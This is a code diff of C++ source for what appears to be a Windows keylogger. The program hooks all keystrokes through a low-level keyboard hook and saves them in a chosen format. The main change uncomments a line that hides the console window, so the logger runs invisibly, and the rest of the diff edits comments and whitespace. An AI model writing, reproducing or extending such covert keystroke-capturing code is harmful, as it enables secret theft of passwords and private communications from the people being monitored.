@@ -5,13 +5,12 @@
 #include <sstream>
 #include <iostream>
 #include <fstream>
-// defines whether the window is visible or not
-// should be solved with makefile, not in this file
-#define invisible // (visible / invisible)
-// defines which format to use for logging
+#define invisible //visible / invisible
+
 // 0 for default, 10 for dec codes, 16 for hex codex
 #define FORMAT 0
-// defines if ignore mouseclicks
+
+// mouseclick
 #define mouseignore
 
 
@@ -86,7 +85,7 @@ void SetHook()
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
 		cout << "failed";
-
+		
 	}
 }
 
@@ -177,7 +176,7 @@ int Save(int key_stroke)
 void invisibleCMD()
 {
 #ifdef invisible
-	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
 #endif
 }
 
